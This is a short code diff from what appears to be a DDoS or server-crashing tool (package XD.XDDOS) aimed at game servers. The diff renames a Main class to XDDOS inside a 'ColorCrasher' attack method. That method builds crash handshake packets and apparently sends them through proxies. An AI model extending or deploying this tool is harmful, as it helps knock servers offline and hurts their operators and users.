@@ -1,6 +1,6 @@
 package XD.XDDOS.methods;
 
-import XD.XDDOS.Main;
+import XD.XDDOS.XDDOS;
 import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.Handshake;
@@ -18,7 +18,7 @@ import java.util.zip.Deflater;
 
 public class ColorCrasher
   implements Method {
-  private Handshake handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
+  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
   
   private byte[] bytes = this.handshake.getWrappedPacket();
   
@@ -41,7 +41,7 @@ public class ColorCrasher
     ByteBuf b = Unpooled.buffer();
     ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
     try {
-      writePacket(PacketUtils.createHandshakePacketCrash(Main.srvRecord, Main.port, 47), bbbb);
+      writePacket(PacketUtils.createHandshakePacketCrash(XDDOS.srvRecord, XDDOS.port, 47), bbbb);
     } catch (IOException ioException) {
       ioException.printStackTrace();
     } 
